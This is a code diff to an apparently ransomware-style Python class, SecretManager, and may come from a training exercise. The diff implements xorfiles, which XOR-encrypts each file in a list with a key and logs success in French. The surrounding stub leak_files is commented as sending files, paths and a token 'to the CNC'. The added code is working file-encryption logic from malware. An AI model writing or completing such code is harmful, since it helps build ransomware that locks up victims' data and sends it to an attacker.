@@ -113,7 +113,12 @@ class SecretManager:
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        raise NotImplemented()
+        for file_path in files:
+            try:
+                xorfile(file_path, self._key)
+                self._log.info(f"Chiffrement {file_path} réussi")
+            except Exception as err:
+                self._log.error(f"Erreur pendant le chiffrement {file_path}: {err}")
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
